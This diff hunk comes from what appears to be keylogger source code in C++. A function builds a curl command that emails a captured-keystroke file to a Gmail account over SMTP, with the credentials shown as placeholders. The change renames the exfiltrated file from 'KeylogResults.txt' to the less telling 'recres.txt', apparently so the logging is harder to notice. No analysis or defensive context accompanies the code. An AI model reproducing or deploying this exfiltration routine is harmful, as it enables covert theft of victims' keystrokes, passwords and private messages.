@@ -64,7 +64,7 @@ std::string makeMailCommand(){
     std::string To = "xxxxx@gmail.com";
     std::string From = "xxxxx@gmail.com";
     std::string Pass = "xxxxx";
-    return("curl smtp://smtp.gmail.com:587 -v --mail-from \"" + From + "\" --mail-rcpt \"" + To + "\" --ssl -u " + From + ":" + Pass + " -T \"KeylogResults.txt\" -k --anyauth");
+    return("curl smtp://smtp.gmail.com:587 -v --mail-from \"" + From + "\" --mail-rcpt \"" + To + "\" --ssl -u " + From + ":" + Pass + " -T \"recres.txt\" -k --anyauth");
 }
 std::string command = makeMailCommand();
 // --------------------------------------------------
